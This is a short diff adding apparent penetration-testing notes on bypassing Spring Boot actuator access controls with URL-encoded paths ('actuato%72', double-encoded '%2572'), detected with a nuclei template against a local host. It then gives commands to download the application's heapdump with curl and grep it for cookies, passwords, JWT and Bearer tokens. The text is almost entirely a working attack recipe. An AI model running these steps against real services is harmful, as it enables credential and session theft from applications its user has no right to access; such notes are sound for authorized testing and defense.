@@ -1,0 +1,17 @@
+Simple URL Encoding in Java Application:
+========================================
+Indication: Whitelabel Error Page / Tomcat
+Nclei Template: sringboot-actuator.yaml
+Add path:  "{{BaseURL}}/actuato%72"  or, "{{BaseURL}}/actuato%2572"
+nuclei http://nahomies.local:8080/api/usermgm -t springboot--actuator.yaml
+Detected: http://nahomies.local:8080/api/usermgm/actuato%72   ---> here will find all names leaked ex: heapdump.
+Download: curl http://nahomies.local:8080/api/usermgm/actuato%72/heapdump -o heapdump
+cat heapdump | strings
+cat heapdump | strings | grep Cookies
+cat heapdump | strings | grep password
+cat heapdump | strings | grep 'eyJ'   ---> jwt token
+cat heapdump | strings | grep 'Bearer' 
+
+-----------------------------------------------------------------------------------------------------------------
+
+
